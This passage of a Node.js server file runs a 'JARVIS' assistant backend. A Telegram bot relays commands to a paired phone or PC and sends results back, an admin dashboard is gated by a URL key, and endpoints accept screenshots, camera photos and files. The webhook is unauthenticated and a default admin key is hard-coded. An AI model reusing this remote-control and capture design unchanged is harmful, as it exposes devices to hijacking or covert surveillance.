    // add korle bot sudhu oi chat-ei kotha bolbe. /devices = connected devices,
    // /phone <cmd> / /pc <cmd> = command pathao; reply result hisebe fire asbe.
    if (req.method === "POST" && pathname === "/api/telegram/webhook") {
      const update = await readJsonBody(req, 1024 * 1024);
      const msg = update.message || update.edited_message || null;
      if (msg && msg.text && TELEGRAM_BOT_TOKEN) {
        const chatId = msg.chat.id;
        const cfg = loadConfig();
        const allowed = Array.isArray(cfg.telegram_chats) ? cfg.telegram_chats : [];
        const text = String(msg.text).trim();
        if (text === "/start") {
          tgSend(chatId, "🤖 JARVIS Bot — tomar chat id: " + chatId + "\nDashboard-e (Remote control > Telegram) ei chat id-ta add koro, tarpor /devices likho.");
        } else if (allowed.indexOf(String(chatId)) < 0) {
          tgSend(chatId, "⛔ Ei bot-ta sudhu owner-er jonno. Age /start kore chat id dashboard-e add koro.");
        } else if (text === "/devices") {
          const users = loadUsers();
          const pairs = loadPairs();
          const lines = ["📱 Connected devices:"];
          Object.keys(users).forEach(function(id) {
            const u = users[id];
            const on = u.last_seen ? (Date.now() - new Date(u.last_seen).getTime() < 16 * 60 * 1000) : false;
            lines.push((on ? "🟢" : "⚪") + " Phone " + (u.device_model || id.slice(0, 8)) + " v" + (u.app_version || "?") + " — /phone <command>");
            if (u.paired_pc_id) {
              const pr = pairs[u.paired_pc_id] || {};
              const pcOn = pr.last_seen ? (Date.now() - new Date(pr.last_seen).getTime() < 2 * 60 * 1000) : false;
              lines.push((pcOn ? "🟢" : "⚪") + " PC " + (pr.pc_name || u.paired_pc_id) + " — /pc <command>");
            }
          });
          lines.push("\nExample: /phone find my phone");
          tgSend(chatId, lines.join("\n"));
        } else if (text.startsWith("/phone ") || text.startsWith("/pc ")) {
          const target = text.startsWith("/phone ") ? "phone" : "pc";
          const cmd = text.slice(target === "phone" ? 7 : 4).trim();
          const users = loadUsers();
          const ids = Object.keys(users);
          if (!ids.length) { tgSend(chatId, "Kono phone connect hoy ni ekhono."); }
          else {
            const id = ids[0];
            let to = id;
            if (target === "pc") {
              if (!users[id].paired_pc_id) { tgSend(chatId, "Ei phone-er sathe kono PC pair hoy ni."); }
              else to = users[id].paired_pc_id;
            }
            if (to) {
              const mid = crypto.randomBytes(8).toString("hex");
              pushRelay(to, { id: mid, from: "telegram", kind: "text", text: cmd, audio_file: "", at: new Date().toISOString() });
              tgSend(chatId, "⏳ " + (target === "phone" ? "📱 Phone" : "💻 PC") + "-ke pathalam: " + cmd + "\nReply ele ekhanei asbe.");
            }
          }
        } else {
          tgSend(chatId, "Commands: /devices — connected devices dekho\n/phone <command> — phone-ke command\n/pc <command> — PC-ke command");
        }
      }
      return sendJson(res, 200, { ok: true });
    }

    // ---- GET /admin (dashboard)
    if (req.method === "GET" && pathname === "/admin") {
      const key = url.searchParams.get("key") || "";
      if (key !== ADMIN_KEY) return sendHtml(res, 200, keyFormHtml());
      return sendHtml(res, 200, dashboardHtml(loadUsers(), loadDevices(), loadConfig(), key));
    }

    // ---- GET / (short intro)
    if (req.method === "GET" && pathname === "/") {
      return sendHtml(res, 200, `<!DOCTYPE html><html><head><meta charset="utf-8"><title>JARVIS backend</title></head>
<body style="font-family:system-ui,sans-serif;background:#0b0f16;color:#e6f1ff;padding:24px">
<h1 style="color:#22d3ee">JARVIS backend v2</h1>
<p>API is running. Endpoints: <code>GET /health</code>, <code>GET /api/config</code>, <code>POST /api/heartbeat</code>, <code>POST /api/event</code>, <code>POST /api/history</code>, <code>POST /api/screenshot</code>, <code>POST /api/camera-photo</code>, <code>POST /api/files</code>, <code>GET /api/admin/users?key=…</code>, <code>POST /api/admin/action</code>, <code>POST /api/admin/message</code>, <code>POST /api/admin/notify-email</code>, <code>GET /api/admin/config?key=…</code>, <code>POST /api/admin/config</code>, <code>GET /admin?key=…</code></p>
</body></html>`);
    }

    return sendJson(res, 404, { error: "not found" });
  } catch (e) {
    console.error(e);
    if (!res.headersSent) return sendJson(res, 500, { error: "server error" });
    res.end();
  }
});

// v1.7.0: Telegram — notun result ele allowed chat-e pathiye dao (10 sec-e check)
let tgLastSent = {};
setInterval(() => {
  if (!TELEGRAM_BOT_TOKEN) return;
  try {
    const cfg = loadConfig();
    const allowed = Array.isArray(cfg.telegram_chats) ? cfg.telegram_chats : [];
    if (!allowed.length) return;
    fs.mkdirSync(RESULTS_DIR, { recursive: true });
    fs.readdirSync(RESULTS_DIR).forEach((f) => {
      const id = f.replace(/\.json$/, "");
      const arr = loadResults(id);
      const last = arr[arr.length - 1];
      if (!last) return;
      const key = id + ":" + last.at + ":" + last.text;
      if (tgLastSent[id] === key) return;
      tgLastSent[id] = key;
      allowed.forEach((c) => tgSend(c, "✅ Result (" + id.slice(0, 8) + "):\n" + last.text));
    });
  } catch (e) {}
}, 10000);

server.listen(PORT, () => {
  console.log("JARVIS backend v2 listening on port " + PORT);
  if (USING_DEFAULT_KEY) {
    console.log("WARNING: using default ADMIN_KEY (jarvis-admin-123) — set ADMIN_KEY env var!");
  }
});
